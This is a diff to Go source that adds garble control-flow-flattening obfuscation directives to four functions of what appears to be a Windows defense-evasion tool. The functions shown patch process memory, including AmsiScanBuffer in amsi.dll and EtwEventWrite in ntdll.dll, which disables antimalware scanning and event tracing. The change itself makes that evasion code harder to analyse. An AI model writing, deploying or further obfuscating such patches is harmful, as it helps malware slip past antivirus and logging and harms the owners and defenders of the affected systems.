@@ -8,6 +8,7 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func PatchLocal(address uintptr, patch []byte) error {
 	// Add write permissions
 	var oldprotect uint32
@@ -36,6 +37,7 @@ func PatchLocal(address uintptr, patch []byte) error {
 	return nil
 }
 
+//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func verifyPatch(address uintptr, patch []byte) bool {
 	for i := 0; i < len(patch); i++ {
 		if *(*byte)(unsafe.Pointer(address + uintptr(i))) != patch[i] {
@@ -47,6 +49,7 @@ func verifyPatch(address uintptr, patch []byte) bool {
 	return true
 }
 
+//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func patchAmsiLocal() error {
 	fmt.Println("[*] Patching AmsiScanBuffer -- Local Process")
 	amsidll, _ := syscall.LoadLibrary("amsi.dll")
@@ -61,6 +64,7 @@ func patchAmsiLocal() error {
 	return nil
 }
 
+//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func patchEtwLocal() error {
 	fmt.Println("[*] Patching EtwEventWrite -- Local Process")
 	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
